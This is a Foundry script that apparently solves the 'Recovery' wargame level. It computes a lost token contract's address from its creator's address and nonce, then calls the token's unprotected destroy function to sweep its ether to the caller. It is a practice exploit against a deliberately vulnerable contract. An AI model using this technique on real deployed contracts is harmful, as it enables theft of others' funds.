// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/17_IRecovery.sol";

address constant INSTANCE = 0x0758a33EA253d983D523Aa93889815d85546785f;

contract RecoveryPOCScript is Script {
    function run() external {
        vm.startBroadcast();

        address lostcontract = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(INSTANCE), bytes1(0x01)))))
        );
        ISimpleToken(lostcontract).destroy(payable(msg.sender));

        vm.stopBroadcast();
    }
}
